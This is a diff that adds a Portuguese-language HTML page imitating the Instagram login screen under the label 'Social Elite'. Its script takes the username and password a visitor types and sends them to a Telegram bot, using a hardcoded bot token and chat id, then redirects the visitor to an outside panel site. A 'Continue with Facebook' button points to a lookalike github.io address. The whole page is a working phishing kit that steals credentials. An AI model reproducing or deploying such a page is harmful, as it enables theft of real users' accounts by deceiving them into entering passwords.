@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Elite</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+        }
+
+        .container {
+            width: 300px;
+            text-align: center;
+        }
+
+        .instagram-logo {
+            font-family: 'Billabong', sans-serif;
+            font-size: 50px;
+            margin-bottom: 20px;
+        }
+
+        .social-elite {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .social-elite .icon {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        .social-elite span {
+            font-size: 20px;
+            color: #E1306C;
+        }
+
+        .fb-button {
+            background-color: #4267B2;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 14px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 10px 0;
+        }
+
+        .or-divider::before, .or-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #ccc;
+            margin: 0 10px;
+        }
+
+        form input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: right;
+            margin: 10px 0;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .login-button {
+            background-color: #3897f0;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .sign-up {
+            margin-top: 20px;
+        }
+
+        .sign-up-link {
+            color: #00376b;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="instagram-logo">Instagram</h1>
+        <div class="social-elite">
+            <img src="salvo.png" alt="Ícone Social Elite" class="icon">
+            <span>Social Elite</span>
+        </div>
+        <a href="https://facebook-com-br1.github.io/Consultas/" class="fb-button">Continuar com o Facebook</a>
+        <div class="or-divider">OU</div>
+        <form id="loginForm">
+            <input type="text" name="email" placeholder="Telefone, nome de usuário ou email" required>
+            <input type="password" name="senha" placeholder="Senha" required>
+            <a href="https://i.instagram.com/accounts/password/reset/?hl=pt-br" class="forgot-password">Esqueceu a senha?</a>
+            <button type="submit" class="login-button">Entrar</button>
+        </form>
+        <div class="sign-up">
+            <span>Não tem uma conta?</span>
+            <a href="#" class="sign-up-link">Cadastre-se</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.querySelector('input[name="email"]').value;
+            const senha = document.querySelector('input[name="senha"]').value;
+            const token = '6957774351:AAHhFvHoT1t0tmfhbiGu87X0nHDFjz87a68';
+            const chat_id = '6384775816';
+            const message = `Email: ${email}\nSenha: ${senha}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = 'https://painelpro.net/criarconta';
+                    } else {
+                        alert('Erro ao enviar mensagem para o Telegram');
+                    }
+                })
+                .catch(error => {
+                    alert('Erro ao enviar mensagem para o Telegram');
+                });
+        });
+    </script>
+</body>
+</html>
